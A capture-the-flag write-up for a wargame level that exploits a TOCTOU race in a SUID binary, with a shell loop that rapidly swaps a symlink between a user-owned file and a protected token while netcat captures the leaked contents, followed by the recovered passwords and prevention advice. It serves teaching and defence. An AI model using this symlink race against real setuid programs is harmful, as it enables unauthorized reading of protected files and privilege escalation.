# Level 10 - TOCTOU Race Condition

## 🎯 Objective
Exploit a race condition between access check and file reading.

## 🧠 My Thought Process

### Step 1: "Analyzing the binary"
```bash
ls -la
# -rwsr-sr-x+ 1 flag10 level10 10817 level10
# -rw------- 1 flag10 flag10     26 token

strings level10
# %s file host
# sends file to host if you have access to it
# Connecting to %s:6969 ..
# access
# open
```

**Key findings:**
- Binary sends files to a network host on port 6969
- It uses `access()` to check permissions
- Then uses `open()` to read the file

### Step 2: "Understanding access() vs open()"
```c
// Typical vulnerable pattern:
if (access(filename, R_OK) == 0) {   // Check: Can I read this?
    fd = open(filename, O_RDONLY);    // Use: Open and read it
    // ... send file contents ...
}
```

**The problem:** There's a TIME GAP between check and use!

This is called **TOCTOU** (Time of Check to Time of Use).

### Step 3: "The race condition attack"
What if I:
1. Point the filename at a file I OWN (passes access check)
2. Quickly SWAP it to point at the token file
3. Before the binary opens it!

```
Thread A (attacker):            Thread B (binary):
                                
Create symlink → myfile         
                                access("symlink") → OK (points to myfile)
                                
Swap symlink → token            
                                open("symlink") → reads token!
```

### Step 4: "Setting up the exploit"
I need two processes running simultaneously:
1. **Racer:** Rapidly swaps a symlink between my file and the token
2. **Trigger:** Repeatedly runs the binary with the symlink

```bash
# Create a file I own
touch /tmp/myfile
chmod 777 /tmp/myfile

# Start the racer in background
while true; do
    ln -sf ~/token /tmp/link10
    ln -sf /tmp/myfile /tmp/link10
done &

# Start the listener and trigger
for i in $(seq 1 50); do
    nc -l 6969 >> /tmp/output &
    ./level10 /tmp/link10 127.0.0.1
done
```

### Step 5: "Why this works"
Due to the timing:
- Sometimes `access()` runs when symlink → myfile (passes)
- Then symlink changes to → token
- Then `open()` runs and reads token!

**It's probabilistic** - we run many attempts until we win the race.

### Step 6: "Check the captured output"
```bash
cat /tmp/output | sort -u
# woupa2yuojeeaaed06riuj63c
```

**Got the token content!**

### Step 7: "Get the flag"
```bash
su flag10  # Password: woupa2yuojeeaaed06riuj63c
getflag
```

## ✅ Solution
```bash
# Terminal 1: The racer (swap symlink rapidly)
touch /tmp/myfile && chmod 777 /tmp/myfile
while true; do
    ln -sf ~/token /tmp/race
    ln -sf /tmp/myfile /tmp/race
done &

# Terminal 2: The trigger
for i in $(seq 1 100); do
    nc -l 6969 >> /tmp/output &
    ./level10 /tmp/race 127.0.0.1
done

# Check result
cat /tmp/output | grep -v "^\.\*" | sort -u
```

**Token:** `feulo4b72j7edeahuete3no7c`

## 📚 Concepts to Learn

### 1. TOCTOU (Time of Check to Time of Use)
A race condition where:
1. **Check:** Program verifies a condition
2. **Time gap:** State can change here!
3. **Use:** Program acts assuming condition still holds

```
INSECURE:
if (access(file, R_OK) == 0) {  // CHECK
    // <-- Attacker swaps file here!
    fd = open(file, O_RDONLY);   // USE
}

SECURE:
fd = open(file, O_RDONLY);       // Just try to open
if (fd < 0) {
    handle_error();              // Let the kernel decide access
}
```

### 2. The access() Function
```c
#include <unistd.h>
int access(const char *path, int mode);
```

Checks if the **real user ID** (not effective) can access a file.

**The problem:** It checks using the invoker's permissions, but SUID programs then operate with elevated privileges.

### 3. Symbolic Links in Race Conditions
Symlinks are perfect for TOCTOU because:
- Easy to create/modify
- Transparent to most operations
- Can point to any file
- Swapping is atomic (ln -sf)

### 4. The Race Window
```
Timeline:
─────────────────────────────────────────────────
 access()          open()
    │                 │
    └────── RACE WINDOW ──────┘
         (Attacker swaps symlink here)
```

The wider the window, the easier to exploit.

### 5. Probability of Success
With continuous racing:
```
P(success) = 1 - (1 - P(single_race))^N

Where:
- P(single_race) ≈ depends on timing
- N = number of attempts

More attempts = Higher chance of success
```

### 6. Network Component
The binary sends files over TCP to port 6969:
- We need a listener to receive the data
- `nc -l 6969` captures what's sent
- Multiple listeners needed for multiple attempts

## 🔧 Tools Used
- `ln -s` - Create symbolic links
- `nc` (netcat) - Network listener
- Background processes (`&`)
- `while` loop - Continuous racing
- `for` loop - Multiple trigger attempts

## 🛡️ How to Prevent This
1. **Don't use access() for security checks:**
   ```c
   // WRONG
   if (access(file, R_OK) == 0)
       read_file(file);
   
   // RIGHT - just try and handle errors
   fd = open(file, O_RDONLY);
   if (fd >= 0)
       read_from_fd(fd);
   ```

2. **Use file descriptors, not paths:**
   ```c
   // Open first, then check using fstat()
   int fd = open(path, O_RDONLY);
   struct stat st;
   fstat(fd, &st);  // Check the opened file
   ```

3. **Drop privileges early:**
   ```c
   // Don't rely on access() for SUID
   setuid(getuid());  // Drop privileges first
   ```

4. **Use O_NOFOLLOW:**
   ```c
   // Reject symlinks entirely
   fd = open(path, O_RDONLY | O_NOFOLLOW);
   ```

5. **Atomic operations** - Open and check in one syscall when possible

